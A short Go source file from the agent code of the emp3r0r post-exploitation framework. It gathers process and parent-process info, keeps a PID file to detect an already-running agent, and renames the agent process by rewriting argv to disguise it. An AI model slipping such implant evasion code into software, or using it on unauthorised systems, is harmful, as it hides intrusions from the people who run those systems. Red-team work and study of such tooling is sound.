package agentutils

import (
	"log"
	"os"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// GetAgentProcess fill up info.emp3r0r_def.AgentProcess
func GetAgentProcess() *def.AgentProcess {
	p := &def.AgentProcess{}
	p.PID = os.Getpid()
	p.PPID = os.Getppid()
	p.Cmdline = util.ProcCmdline(p.PID)
	p.Parent = util.ProcCmdline(p.PPID)

	return p
}

// IsAgentRunningPID is there any emp3r0r agent already running?
func IsAgentRunningPID() (bool, int) {
	defer func() {
		myPIDText := strconv.Itoa(os.Getpid())
		if err := os.WriteFile(common.RuntimeConfig.PIDFile, []byte(myPIDText), 0o600); err != nil {
			log.Printf("write common.RuntimeConfig.PIDFile: %v", err)
		}
	}()

	pidBytes, err := os.ReadFile(common.RuntimeConfig.PIDFile)
	if err != nil {
		return false, -1
	}
	pid, err := strconv.Atoi(string(pidBytes))
	if err != nil {
		return false, -1
	}

	_, err = os.FindProcess(pid)
	return err == nil, pid
}

// SetProcessName rename agent process by modifying its argv, all cmdline args are dropped
func SetProcessName(name string) {
	util.SetProcName(name)
}
